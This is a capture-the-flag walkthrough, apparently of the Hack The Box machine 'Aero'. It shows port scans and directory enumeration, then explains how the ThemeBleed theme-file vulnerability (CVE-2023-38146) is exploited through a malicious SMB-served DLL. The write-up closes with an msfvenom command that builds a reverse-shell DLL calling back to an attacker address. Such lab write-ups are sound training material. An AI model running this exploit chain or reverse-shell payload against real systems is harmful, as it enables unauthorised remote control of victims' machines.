---
title: "Aero"
date: 2024-02-21
categories: HTB
tags: ["ctf", "penetration testing", "htb", "cybersecurity", "aero", "htb writeup", "htb walkthrough", "hackthebox", "writeup"]
---

# Aero

# Aero

## Enumeration 
### Port Scan
# TCP
```sh
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Aero Theme Hub
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

# UDP
```sh
PORT      STATE         SERVICE      VERSION
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown
```



## Gobuster
```sh
/home
/upload
/.
```


# Screenshots
![screenshot](/assets/images/aero1.png)

http://10.10.11.237/home#upload
![screenshot](/assets/images/aero2.png)

![screenshot](/assets/images/aero3.png)
Allowed upload
- `.theme`
- `.themepack`

# Foothold
CVE-2023-38146
https://github.com/exploits-forsale/themebleed

- The theme tries to load the style file from a SMB share on my host.
- That triggers interaction with a file ending in `_vrf.dll`, first opening it with the `CreateFile` API to read it and verify it's signature, and then opening it with the `LoadLibrary` API. 
- The SMB server uses the differences in how it's opened to return either the legit DLL or the malicious one. 


Reverse shell DLL
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.42 LPORT=445 -f dll > VerifyThemeVersion
```
